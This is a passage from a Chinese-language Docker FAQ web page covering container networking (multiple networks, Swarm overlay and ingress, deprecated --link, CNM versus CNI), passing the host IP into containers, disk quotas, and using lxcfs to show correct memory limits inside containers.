的容器是否启动正常： <code>docker ps</code>、<code>docker top &lt;容器ID&gt;</code>、<code>docker logs &lt;容器ID&gt;</code>、<code>docker exec -it &lt;容器ID&gt; bash</code>等，这是比较常用的排障的命令；如果是 <code>docker-compose</code> 也有其对应的这一组命令，所以排障很容易。</p><p>如果确保服务一切正常，甚至在容器里，可以访问到这些服务，<code>docker ps</code> 也显示出了端口映射成功，那么就需要检查防火墙了。</p><h2 id="问：如何让一个容器连接两个网络？"><a href="#问：如何让一个容器连接两个网络？" class="headerlink" title="问：如何让一个容器连接两个网络？"></a>问：如何让一个容器连接两个网络？</h2><p><strong>答：</strong>如果是使用 <code>docker run</code>，那很不幸，一次只可以连接一个网络，因为 <code>docker run</code> 的 <code>--network</code> 参数只可以出现一次（如果出现多次，最后的会覆盖之前的）。不过容器运行后，可以用命令 <code>docker network connect</code> 连接多个网络。<br>假设我们创建了两个网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker network create mynet1</span><br><span class="line">$ docker network create mynet2</span><br></pre></td></tr></table></figure><p>然后，我们运行容器，并连接这两个网络。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d --name web --network mynet1 nginx</span><br><span class="line">$ docker network connect mynet2 web</span><br></pre></td></tr></table></figure><p>但是如果使用 <code>docker-compose</code> 那就没这个问题了。因为实际上，<code>Docker Remote API</code> 是支持一次性指定多个网络的，但是估计是命令行上不方便，所以 <code>docker run</code> 限定为只可以一次连一个。<code>docker-compose</code> 直接就可以将服务的容器连入多个网络，没有问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line">    web:</span><br><span class="line">        image: nginx</span><br><span class="line">        networks:</span><br><span class="line">            - mynet1</span><br><span class="line">            - mynet2</span><br><span class="line">networks:</span><br><span class="line">    mynet1:</span><br><span class="line">    mynet2:</span><br></pre></td></tr></table></figure><h2 id="问：Docker-多宿主网络怎么配置？"><a href="#问：Docker-多宿主网络怎么配置？" class="headerlink" title="问：Docker 多宿主网络怎么配置？"></a>问：Docker 多宿主网络怎么配置？</h2><p><strong>答</strong>：Docker 跨节点容器网络互联，最通用的是使用 <code>overlay</code> 网络。<br>一代 <code>Swarm</code> 已经不再使用，它要求使用 <code>overlay</code>网络前先准备好分布式键值库，比如 <code>etcd</code>, <code>consul</code> 或 <code>zookeeper</code>。然后在每个节点的 Docker 引擎中，配置 <code>--cluster-store</code> 和 <code>--cluster-advertise</code> 参数。这样才可以互连。<br>现在都在使用二代 <code>Swarm</code>，也就是 <code>Docker Swarm Mode</code>，非常简单，只要 <code>docker swarm init</code> 建立集群，其它节点 <code>docker swarm join</code>加入集群后，集群内的服务就自动建立了 <code>overlay</code> 网络互联能力。</p><p>需要注意的是，如果是多网卡环境，无论是 <code>docker swarm init</code> 还是 <code>docker swarm join</code>，都不要忘记使用参数 <code>--advertise-addr</code> 指定宣告地址，否则自动选择的地址很可能不是你期望的，从而导致集群互联失败。格式为 <code>--advertise-addr &lt;地址&gt;:&lt;端口&gt;</code>，地址可以是 <code>IP</code>地址，也可以是网卡接口，比如 <code>eth0</code>。端口默认为 <code>2377</code>，如果不改动可以忽略。</p><p>此外，这是供服务使用的 <code>overlay</code>，因此所有 <code>docker service create</code> 的服务容器可以使用该网络，而 <code>docker run</code> 不可以使用该网络，除非明确该网络为 <code>--attachable</code>。</p><p>关于<code>overlay</code> 网络的进一步信息，可以参考官网文档：</p><ul><li><a href="https://docs.docker.com/engine/userguide/networking/get-started-overlay/" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/networking/get-started-overlay/</a></li></ul><p>虽然默认使用的是 <code>overlay</code> 网络，但这并不是唯一的多宿主互联方案。Docker 内置了一些其它的互联方案，比如效率比较高的 <code>macvlan</code>。如果在局域网络环境下，对 <code>overlay</code> 的额外开销不满意，那么可以考虑 <code>macvlan</code> 以及 <code>ipvlan</code>，这是比较好的方案。</p><ul><li><a href="https://docs.docker.com/engine/userguide/networking/get-started-macvlan/" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/networking/get-started-macvlan/</a></li></ul><p>此外，还有很多第三方的网络可以用来进行跨宿主互联，可以访问官网对应文档进一步查看：</p><ul><li><a href="https://docs.docker.com/engine/extend/legacy_plugins/#/network-plugins" target="_blank" rel="noopener">https://docs.docker.com/engine/extend/legacy_plugins/#/network-plugins</a></li></ul><h2 id="问：明明-docker-network-ls-中看到了建立的-overlay-网络，怎么-docker-run-还说网络不存在啊？"><a href="#问：明明-docker-network-ls-中看到了建立的-overlay-网络，怎么-docker-run-还说网络不存在啊？" class="headerlink" title="问：明明 docker network ls 中看到了建立的 overlay 网络，怎么 docker run 还说网络不存在啊？"></a>问：明明 docker network ls 中看到了建立的 overlay 网络，怎么 docker run 还说网络不存在啊？</h2><p><strong>答：</strong> 如果在 <code>docker network ls</code> 中看到了如下的 <code>overlay</code> 网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID          NAME                DRIVER              SCOPE</span><br><span class="line">...</span><br><span class="line">24pz359114y0        mynet               overlay             swarm</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那么这个名为 <code>mynet</code> 的网络是不可以连接到 <code>docker run</code> 的容器。如果试图连接则会出现报错。<br>如果是 1.12 的系统，会看到这样报错信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm --network mynet busybox</span><br><span class="line">docker: Error response from daemon: network mynet not found.</span><br><span class="line">See <span class="string">'docker run --help'</span>.</span><br></pre></td></tr></table></figure><p>报错说 <code>mynet</code> 网络找不到。其实如果仔细观察，会看到这个名为 <code>mynet</code> 的网络，驱动是 <code>overlay</code> 没有错，但它的 <code>Scope</code> 是 <code>swarm</code>。这个意思是说这个网络是在二代 <code>Swarm</code> 环境中建立的 <code>overlay</code> 网络，因此只可以由 <code>Swarm</code> 环境下的服务容器才可以使用。而 <code>docker run</code>所运行的只是零散的容器，并非 <code>Service</code>，因此自然在零散容器所能使用的网络中，不存在叫 <code>mynet</code> 网络。</p><p><code>docker run</code> 可以使用的 <code>overlay</code> 网络是 <code>Scope</code> 为 <code>global</code> 的 <code>overlay</code> 网络，也就是使用外置键值库所建立的 <code>overlay</code> 网络，比如一代 <code>Swarm</code> 的 <code>overlay</code> 网络。</p><p>这点在 1.13 后稍有变化。如果是 1.13 以后的系统，会看到这样的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm --network mynet busybox</span><br><span class="line">docker: Error response from daemon: Could not attach to network mynet: rpc error: code = 7</span><br><span class="line"> desc = network mynet not manually attachable.</span><br></pre></td></tr></table></figure><p>报错信息不再说网络找不到，而是说这个 <code>mynet</code> 网络无法连接。这是由于从 1.13 开始，允许在建立网络的时候声明这个网络是否可以被零散的容器所连接。如果 <code>docker network create</code> 加了 <code>--attachable</code> 的参数，那么在后期，这个网络是可以被普通容器所连接的。</p><p>但是这是在安全模型上开了一个口子，因此，默认不允许普通容器链接，并且不建议使用。</p><h2 id="问：使用-Swarm-Mode-的时，看到有个叫-ingress-的-overlay-网络，它和自己创建的网络有什么区别？"><a href="#问：使用-Swarm-Mode-的时，看到有个叫-ingress-的-overlay-网络，它和自己创建的网络有什么区别？" class="headerlink" title="问：使用 Swarm Mode 的时，看到有个叫 ingress 的 overlay 网络，它和自己创建的网络有什么区别？"></a>问：使用 Swarm Mode 的时，看到有个叫 ingress 的 overlay 网络，它和自己创建的网络有什么区别？</h2><p><strong>答：</strong>  在启用了二代 Swarm 后，可能会在网络列表时看到一个名为 ingress 的 overlay 网络。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker network ls</span><br><span class="line">NETWORK ID          NAME                DRIVER              SCOPE</span><br><span class="line">6beb824623a4        bridge              bridge              <span class="built_in">local</span></span><br><span class="line">f3f636574c7a        docker_gwbridge     bridge              <span class="built_in">local</span></span><br><span class="line">cfeb2513a4a3        host                host                <span class="built_in">local</span></span><br><span class="line">88smbt683r5p        ingress             overlay             swarm</span><br><span class="line">24pz359114y0        mynet               overlay             swarm</span><br><span class="line">d35d69ece740        none                null                <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>这里可以看到两个 <code>overlay</code> 网络，其中一个是我们创建的 <code>mynet</code>，另一个则是 Docker 引擎自己创建的 <code>ingress</code>，从驱动和 <code>Scope</code> 可以看出两个网络都是给 Swarm Mode 使用的 <code>overlay</code> 网络。</p><p><code>ingress</code> 是 <code>overlay</code> 网络，但并不是普通的 <code>overlay network</code>，它是为边界进入流量特殊准备的网络。这个网络存在于集群中每一个Docker宿主上，不需要额外建立。</p><p>当我们使用 <code>docker service create -p 80:80</code> 这种形式创建一个服务的时候，我们要求映射集群端口 <code>80</code> 到服务容器的 <code>80</code> 端口上。其效果是访问任一节点的 <code>80</code> 端口，即使这个节点没有运行我们所需的容器，依旧可以连接到容器服务，并且取得结果。实现这样效果的一个原因就是因为 <code>ingress</code> 网络的存在。</p><p>Swarm 中的每个节点，都会有一个隐藏的沙箱容器监听宿主的服务端口，用于接收来自集群外界的访问。</p><p>我们可以通过 <code>docker network inspect ingress</code> 来看到这个沙箱容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ docker network inspect ingress</span><br><span class="line">[</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="string">"Name"</span>: <span class="string">"ingress"</span>,</span><br><span class="line">       <span class="string">"Id"</span>: <span class="string">"88smbt683r5p7c0l7sd0dpniw"</span>,</span><br><span class="line">       <span class="string">"Scope"</span>: <span class="string">"swarm"</span>,</span><br><span class="line">       <span class="string">"Driver"</span>: <span class="string">"overlay"</span>,</span><br><span class="line">       <span class="string">"EnableIPv6"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"IPAM"</span>: &#123;</span><br><span class="line">           <span class="string">"Driver"</span>: <span class="string">"default"</span>,</span><br><span class="line">           <span class="string">"Options"</span>: null,</span><br><span class="line">           <span class="string">"Config"</span>: [</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="string">"Subnet"</span>: <span class="string">"10.255.0.0/16"</span>,</span><br><span class="line">                   <span class="string">"Gateway"</span>: <span class="string">"10.255.0.1"</span></span><br><span class="line">               &#125;</span><br><span class="line">           ]</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="string">"Internal"</span>: <span class="literal">false</span>,</span><br><span class="line">       <span class="string">"Containers"</span>: &#123;</span><br><span class="line">           <span class="string">"faff08692b5f916fcb15aa7ac6bc8633a0fa714a52a1fb75e57525c94581c45a"</span>: &#123;</span><br><span class="line">               <span class="string">"Name"</span>: <span class="string">"web.1.1jyunyva6picwsztzrj6t2cio"</span>,</span><br><span class="line">               <span class="string">"EndpointID"</span>: <span class="string">"58240770eb25565b472384731b1b90e36141a633ce184a5163829cf96e9d1195"</span>,</span><br><span class="line">               <span class="string">"MacAddress"</span>: <span class="string">"02:42:0a:ff:00:05"</span>,</span><br><span class="line">               <span class="string">"IPv4Address"</span>: <span class="string">"10.255.0.5/16"</span>,</span><br><span class="line">               <span class="string">"IPv6Address"</span>: <span class="string">""</span></span><br><span class="line">           &#125;,</span><br><span class="line">           <span class="string">"ingress-sbox"</span>: &#123;</span><br><span class="line">               <span class="string">"Name"</span>: <span class="string">"ingress-endpoint"</span>,</span><br><span class="line">               <span class="string">"EndpointID"</span>: <span class="string">"fe8f89d4f99d7bacb14c5cb723682c180278d62e9edd10b523cdd81a45695c5d"</span>,</span><br><span class="line">               <span class="string">"MacAddress"</span>: <span class="string">"02:42:0a:ff:00:03"</span>,</span><br><span class="line">               <span class="string">"IPv4Address"</span>: <span class="string">"10.255.0.3/16"</span>,</span><br><span class="line">               <span class="string">"IPv6Address"</span>: <span class="string">""</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="string">"Options"</span>: &#123;</span><br><span class="line">           <span class="string">"com.docker.network.driver.overlay.vxlanid_list"</span>: <span class="string">"256"</span></span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="string">"Labels"</span>: &#123;&#125;</span><br><span class="line">   &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在上面的命令返回信息中，我们可以看到一个名为 <code>ingress-endpoint</code> 的容器，这就是边界沙箱容器。</p><p>当我们创建服务时，使用了 <code>-p</code> 参数后，服务容器就会被自动的加入到 <code>ingress</code>网络中，同时会在沙箱中注册映射信息，告知哪个服务要求守护哪个端口，具体对应容器是哪些。</p><p>因此当沙箱收到外部连接后，通过访问端口就可以知道具体服务在守护，然后会通过这个 <code>ingress</code> 网络去将连接请求转发给对应服务容器。而由于 <code>ingress</code> 的本质是 <code>overlay network</code>，因此，无论服务容器运行于哪个节点上，沙箱都可以成功的将连接转发给正确的服务容器。</p><p>所以，<code>ingress</code> 是特殊用途的网络，只要服务有<code>-p</code>选项，那么服务容器就会自动被加入该网络。因此把 <code>ingress</code> 网络当做普通的 <code>overlay</code>网络使用的话，除了会干扰 <code>Swarm</code> 正常的边界负载均衡的能力，也会破坏服务隔离的安全机制。所以不要把这个网络当做普通的 <code>overlay</code>网络来使用，需要控制服务互联和隔离时，请用自行创建的 <code>overlay</code> 网络。</p><h2 id="问：听说-–link-过时不再用了？那容器互联、服务发现怎么办？"><a href="#问：听说-–link-过时不再用了？那容器互联、服务发现怎么办？" class="headerlink" title="问：听说 –link 过时不再用了？那容器互联、服务发现怎么办？"></a>问：听说 –link 过时不再用了？那容器互联、服务发现怎么办？</h2><p><strong>答：</strong> 在 1-2 年前，Docker 所有容器都连接于默认的桥接网络上，也就是很多老文章鼓捣的 <code>docker0</code>桥接网卡。因此实际上默认情况下所有容器都是可以互联的，没有隔离，当然这样安全性不好。而服务发现，是在这种环境下发展出来的，通过修改容器内的 <code>/etc/hosts</code>文件来完成的。凡是 <code>--link</code> 的主机的别名就会出现于 <code>/etc/hosts</code> 中，其地址由 Docker 引擎维护。因此容器间才可以通过别名互访。</p><p>但是这种办法并不是好的解决方案，Docker 早在一年多以前就已经使用自定义网络了。在同一个网络中的容器，可以互联，并且，Docker 内置了 DNS，容器内的应用可以使用服务名、容器名、别名来进行服务发现，名称会经由内置的 DNS 进行解析，其结果是动态的；而不在同一网络中的容器，不可以互联。</p><p>因此，现在早就不用 <code>--link</code> 了，而且非常不建议使用。</p><p>首先是因为使用 <code>--link</code> 就很可能还在用默认桥接网络，这很不安全，所有容器都没有适度隔离，用自定义网络才比较方便互联隔离。</p><p>其次，修改 <code>/etc/hosts</code> 文件有很多弊病。比如，高频繁的容器启停环境时，容易产生竞争冒险，导致 <code>/etc/hosts</code> 文件损坏，出现访问故障；或者有些应用发现是来自于 <code>/etc/hosts</code> 文件后，就假定其为静态文件，而缓存结果不再查询，从而导致容器启停 <code>IP</code> 变更后，使用旧的条目而无法连接到正确的容器等等。</p><p>另外，在一代 <code>Swarm</code> 环境中，在 <code>docker-compose.yml</code> 中使用了 <code>links</code>就意味着服务间的强依赖关系，因此调度时不会将服务运行于不同节点，而是全部运行于一个节点，使得横向扩展失败。</p><p>所以不要再使用 <code>--link</code> 以及 <code>docker-compose.yml</code> 中的 <code>links</code> 了。应该使用 <code>docker network</code>，建立网络，而 <code>docker run --network</code> 来连接特定网络。或者使用 <code>version: &#39;2&#39;</code> 的 <code>docker-compose.yml</code> 直接定义自定义网络并使用。</p><h2 id="问：CNM和CNI分别是啥东东？"><a href="#问：CNM和CNI分别是啥东东？" class="headerlink" title="问：CNM和CNI分别是啥东东？"></a>问：CNM和CNI分别是啥东东？</h2><p><strong>答：</strong> 目前关于Linux容器网络接口的配置有两种的可能的标准：<code>容器网络模型（CNM）</code>和<code>容器网络接口（CNI）</code>。网络是相当复杂的，而且提供某种功能的方式也多种多样。</p><p><code>CNM</code>是一个被 Docker 公司提出的规范。现在已经被<code>Cisco Contiv</code>,<code>Kuryr</code>, <code>Open Virtual Networking (OVN)</code>, <code>Project Calico</code>, <code>VMware</code> 和 <code>Weave</code>这些公司和项目所采纳。</p><p><code>CNI</code>是由<code>CoreOS</code>提出的一个容器网络规范。已采纳改规范的包括<code>Apache Mesos</code>, <code>Cloud Foundry</code>, <code>Kubernetes</code>, <code>Kurma</code> 和 <code>rkt</code>。另外 <code>Contiv Networking</code>, <code>Project Calico</code> 和 <code>Weav</code>e这些项目也为CNI提供插件。</p><p>这两种方案都使用了驱动模型或者插件模型来为容器创建网络栈。这样的设计使得用户可以自由选择。两者都支持多个网络驱动被同时使用，也允许容器加入一个或多个网络。两者也都允许容器<code>runtime</code>在它自己的命名空间中启动网络。</p><p><code>CNM</code> 模式下的网络驱动不能访问容器的网络命名空间。这样做的好处是<code>libnetwork</code>可以为冲突解决提供仲裁。一个例子是：两个独立的网络驱动提供同样的静态路由配置，但是却指向不同的下一跳IP地址。与此不同，<code>CNI</code>允许驱动访问容器的网络命名空间。<code>CNI</code>正在研究在类似情况下如何提供仲裁。</p><p><code>CNI</code>支持与第三方<code>IPAM</code>的集成，可以用于任何容器<code>runtime</code>。<code>CNM</code>从设计上就仅仅支持Docker。由于<code>CNI</code>简单的设计，许多人认为编写<code>CNI</code>插件会比编写<code>CNM</code>插件来得简单。</p><p><strong><code>CNI</code>官方网络插件</strong></p><p>地址：</p><ul><li><a href="https://github.com/containernetworking/cni" target="_blank" rel="noopener">https://github.com/containernetworking/cni</a></li></ul><p>所有的标准和协议都要有具体的实现，才能够被大家使用。<code>CNI</code> 也不例外，目前官方在 <code>github</code> 上维护了同名的 <code>CNI</code>代码库，里面已经有很多可以直接拿来使用的 <code>CNI</code>插件。</p><p>官方提供的插件目前分成三类：<code>main</code>、<code>meta</code> 和 <code>ipam</code>。<br><code>main</code> 是主要的实现了某种特定网络功能的插件；<br><code>meta</code> 本身并不会提供具体的网络功能，它会调用其他插件，或者单纯是为了测试；<br><code>ipam</code> 是分配 IP 地址的插件。<code>ipam</code> 并不提供某种网络功能，只是为了灵活性把它单独抽象出来，这样不同的网络插件可以根据需求选择 <code>ipam</code>，或者实现自己的 <code>ipam</code>。</p><p>这些插件的功能详细说明如下：</p><ul><li>main<br>– loopback：这个插件很简单，负责生成 lo 网卡，并配置上 127.0.0.1/8 地址<br>– bridge：和 docker 默认的网络模型很像，把所有的容器连接到虚拟交换机上<br>– macvlan：使用 macvlan 技术，从某个物理网卡虚拟出多个虚拟网卡，它们有独立的 ip 和 mac 地址<br>– ipvlan：和 macvlan 类似，区别是虚拟网卡有着相同的 mac 地址<br>– ptp：通过 veth pair 在容器和主机之间建立通道</li><li>meta<br>– flannel：结合 bridge 插件使用，根据 flannel 分配的网段信息，调用 bridge 插件，保证多主机情况下容器</li><li>ipam<br>– host-local：基于本地文件的 ip 分配和管理，把分配的 IP 地址保存在文件中<br>– dhcp：从已经运行的 DHCP 服务器中获取 ip 地址</li></ul><h2 id="问：容器怎么取宿主机-IP-啊？"><a href="#问：容器怎么取宿主机-IP-啊？" class="headerlink" title="问：容器怎么取宿主机 IP 啊？"></a>问：容器怎么取宿主机 IP 啊？</h2><p><strong>答：</strong></p><p><strong>单机环境</strong></p><p>如果是单机环境，很简单，不必琢磨怎么突破命名空间限制，直接用环境变量送进去即可。</p><p><code>docker run -d -e HOST_IP=&lt;宿主的IP地址&gt; nginx</code></p><p>然后容器内直接读取<code>HOST_IP</code>环境变量即可。</p><p><strong>集群环境</strong></p><p>集群环境相对比较复杂，<code>docker service create</code> 中的 <code>-e</code> 以及 <code>--env-file</code>是在服务创建时指定、读取环境变量内容，而不是运行时，因此对于每个节点都是一样的。而且目前不存在 <code>dockerd -e</code> 选项，所以直接使用这些选项达不到我们想要的效果。</p><p>不过有变通的办法，可以在宿主上建立一个 <code>/etc/variables</code> 文件（名字随意，这里用这个文件举例）。其内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOST_IP=1.2.3.4</span><br></pre></td></tr></table></figure><p>其中 <code>1.2.3.4</code> 是这个节点的宿主 IP，因此每个节点的 <code>/etc/variables</code> 的内容不同。</p><p>而在启动服务时，指定挂载这个服务端本地文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker service create --name app \</span><br><span class="line">    --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,<span class="built_in">source</span>=/etc/variables,target=/etc/variables:ro \</span><br><span class="line">    myapp</span><br></pre></td></tr></table></figure><p>由于 <code>--mount</code> 是发生于容器运行时，因此所加载的是所运行的服务器的 <code>/etc/variables</code>，里面所包含的也是该服务器的 <code>IP</code> 地址。</p><p>在 <code>myapp</code> 这个镜像的入口脚本加入加载该环境变量文件的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/variables</span><br></pre></td></tr></table></figure><p>这样 <code>app</code> 这个服务容器就会拥有 <code>HOST_IP</code> 环境变量，其值为所运行的宿主 <code>IP</code>。</p><h2 id="问：容器磁盘可以限制配额么？"><a href="#问：容器磁盘可以限制配额么？" class="headerlink" title="问：容器磁盘可以限制配额么？"></a>问：容器磁盘可以限制配额么？</h2><p><strong>答：</strong> 对于 <code>devicemapper</code>, <code>btrfs</code>, <code>zfs</code> 来说，可以通过 <code>--storage-opt size=100G</code>这种形式限制 <code>rootfs</code> 的大小。</p><p><code>docker create -it --storage-opt size=120G fedora /bin/bash</code></p><p>参考官网文档：</p><ul><li><a href="https://docs.docker.com/engine/reference/commandline/run/#/set-storage-driver-options-per-container" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/run/#/set-storage-driver-options-per-container</a></li></ul><h2 id="问：我在容器里面看到的内存使用量是真实的该容器内存使用情况？"><a href="#问：我在容器里面看到的内存使用量是真实的该容器内存使用情况？" class="headerlink" title="问：我在容器里面看到的内存使用量是真实的该容器内存使用情况？"></a>问：我在容器里面看到的内存使用量是真实的该容器内存使用情况？</h2><p><strong>答：</strong> 不是的，众所周知，Docker相比于虚拟机，在隔离性上略显不足，这个Docker隔离性不足导致资源显示问题。进入容器看到是完整的物理机资源。<br>虽然 Docker原生的资源查询接口可以正确地识别分配的资源，但是用户常用的 <code>top</code>、<code>free</code>等命令却未能正确地识别我们施加于 Docker的资源限制，那么原因究竟是怎样。<br>事实上，类似 <code>top</code>、<code>free</code>等命令，其实多半都是从一些系统文件中获取资源信息,<code>/proc/cpuinfo</code>,<code>/proc/meminfo</code>而 Docker的隔离性不足的问题里，就包括跟宿主机共享 <code>sys</code>、<code>proc</code>等系统文件，因此如果在容器中使用依赖这些文件的命令，如 <code>uptime</code>等，实际上都显示的是宿主机信息。</p><p>容器的显示问题，在很早期的版本中就有人提出过。而 Docker官方可能是出于某些原因的考虑，并没有试图修复这些显示问题。目前来说，解决显示问题还没办法很好地在 Docker中进行集成，仍然需要在 Docker之外做一些修改。</p><p>目前社区中常见的做法是利用 <code>lxcfs</code>来提供容器中的资源可见性。<code>lxcfs</code> 是一个开源的<code>FUSE（用户态文件系统）</code>实现来支持<code>LXC</code>容器，它也可以支持Docker容器。</p><p><code>LXCFS</code>通过用户态文件系统，在容器中提供下列<code>procfs</code> 的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/cpuinfo</span><br><span class="line">/proc/diskstats</span><br><span class="line">/proc/meminfo</span><br><span class="line">/proc/<span class="built_in">stat</span></span><br><span class="line">/proc/swaps</span><br><span class="line">/proc/uptime</span><br></pre></td></tr></table></figure><p>容器中进程读取相应文件内容时，<code>LXCFS</code>的<code>FUSE</code>实现会从容器对应的<code>Cgroup</code>中读取正确的内存限制。从而使得应用获得正确的资源约束设定。</p><p>使用方法：</p><p>安装 <code>lxcfs</code> 的<code>RPM</code>包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://copr-be.cloud.fedoraproject.org/results/ganto/lxd/epel-7-x86_64/00486278-lxcfs/lxcfs-2.0.5-3.el7.centos.x86_64.rpm</span><br><span class="line">$ yum install lxcfs-2.0.5-3.el7.centos.x86_64.rpm</span><br></pre></td></tr></table></figure><p>启动 <code>lxcfs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p /var/lib/lxcfs</span><br><span class="line">$ lxcfs /var/lib/lxcfs &amp;</span><br></pre></td></tr></table></figure><p>运行Docker容器测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it -m 300m \</span><br><span class="line">      -v /var/lib/lxcfs/proc/cpuinfo:/proc/cpuinfo:rw \</span><br><span class="line">      -v /var/lib/lxcfs/proc/diskstats:/proc/diskstats:rw \</span><br><span class="line">      -v /var/lib/lxcfs/proc/meminfo:/proc/meminfo:rw \</span><br><span class="line">      -v /var/lib/lxcfs/proc/<span class="built_in">stat</span>:/proc/<span class="built_in">stat</span>:rw \</span><br><span class="line">      -v /var/lib/lxcfs/proc/swaps:/proc/swaps:rw \</span><br><span class="line">      -v /var/lib/lxcfs/proc/uptime:/proc/uptime:rw \</span><br><span class="line">      centos:7 /bin/bash</span><br><span class="line"></span><br><span class="line">[root@e851562db40d /]<span class="comment"># free -m</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:            300           3         295          29           0         295</span><br><span class="line">Swap:           300           0         300</span><br><span class="line">[root@e851562db40d /]<span class="comment"># cat /proc/meminfo</span></span><br><span class="line">MemTotal:         307200 kB</span><br><span class="line">MemFree:          302768 kB</span><br><span class="line">MemAvailable:     302768 kB</span><br><span class="line">Buffers:               0 kB</span><br><span class="line">.......................</span><br></pre></td></tr></table></figure><p>我们可以看到<code>MemTotal</code>的内存为<code>300MB</code>，配置已经生效。</p><p>官方项目地址：</p><ul><li><a href="https://github.com/lxc/lxcfs" target="_blank" rel="noopener">https://github.com/lxc/lxcfs</a></li></ul><h2 id="问：数据容器、数据卷、命名卷、匿名卷、挂载目录这些都有什么区别？"><a href="#问：数据容器、数据卷、命名卷、匿名卷、挂载目录这些都有什么区别？" class="headerlink" title="问：数据容器、数据卷、命名卷、匿名卷、挂载目录这些都有什么区别？"></a>问：数据容器、数据卷、命名卷、匿名卷、挂载目录这些都有什么区别？</h2><p><strong>答：</strong> 首先，挂载分为<code>挂载本地宿主目录</code> 和 <code>挂载数据卷(Volume)</code>。而数据卷又分为<code>匿名数据卷</code>和<code>命名数据卷</code>。</p><p>绑定宿主目录的概念很容易理解，就是将宿主目录绑定到容器中的某个目录位置。这样容器可以直接访问宿主目录的文件。其形式是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -v /var/www:/app nginx</span><br></pre></td></tr></table></figure><p>这里注意到 <code>-v</code> 的参数中，前半部分是绝对路径。在 <code>docker run</code> 中必须是绝对路径，而在 <code>docker-compose</code> 中，可以是相对路径，因为 <code>docker-compose</code>会帮你补全路径。</p><p>另一种形式是使用 <code>Docker Volume</code>，也就是数据卷。这是很多看古董书的人不了解的概念，不要跟数据容器（Data 